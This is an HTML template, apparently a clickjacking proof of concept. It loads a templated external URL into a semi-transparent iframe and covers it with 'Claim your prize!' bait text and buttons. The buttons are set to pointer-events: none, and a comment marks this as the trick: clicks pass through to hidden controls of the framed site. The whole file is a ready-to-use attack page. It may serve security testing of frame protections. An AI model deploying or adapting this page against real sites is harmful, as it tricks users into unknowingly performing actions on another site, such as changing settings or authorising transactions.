<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Example Template</title>
    <style>
        body { font-family: sans-serif; }
        .iframe-container {
            width: 80%;
            height: 600px;
            margin: 20px auto;
            position: relative;
        }

        .container {
            position: relative; /* Establishes a context for absolute positioning */
            width: 300px;
            height: 100px;
            margin: 50px;
            border: 2px dashed #ccc;
        }

        .button-style {
            position: absolute; /* Allows precise stacking */
            width: 200px;
            height: 50px;
            font-size: 20px;
            cursor: pointer;
            border: none;
            padding: 10px;
            top: 25px;
            left: 50px;
        }

        /* The hidden/target button (Layer 2 - Bottom) */
        #bottom-button {
            background-color: #ff4d4d; /* Red color */
            z-index: 10; /* Ensures it's beneath the top button */
        }

        /* The visible/bait button (Layer 1 - Top) */
        #top-button {
            background-color: #4CAF50; /* Green color */
            color: white;
            z-index: 20; /* Ensures it is visually on top */
            
            /* >>> THE CRITICAL TRICK <<< 
               This property makes the element visible but incapable of capturing mouse events.
               The click passes right through it to the element below.
            */
            pointer-events: none; 
        }
    </style>
</head>
<body>
    <div class="iframe-container">
        <h1 style="text-align: center; position: absolute; top: 20%; left: 20%;">Click buttons below to claim your prize!</h1>
        <iframe 
            src="{{ external_url }}" 
            width="100%" 
            height="100%" 
            frameborder="0"
            allowfullscreen   
            style="opacity: 0.8;" 
        >
        </iframe>
        <button id="button1" style="position: absolute;top: 37%;left: 36%;pointer-events: none;cursor: pointer;z-index: 10;">Click me first, select your name, click "Claim" button!</button>
        <button id="button2" style="position: absolute;top: 54%;right: 47%;pointer-events: none;cursor: pointer;z-index: 10;">Claim!</button>
    </div>
</body>
</html>
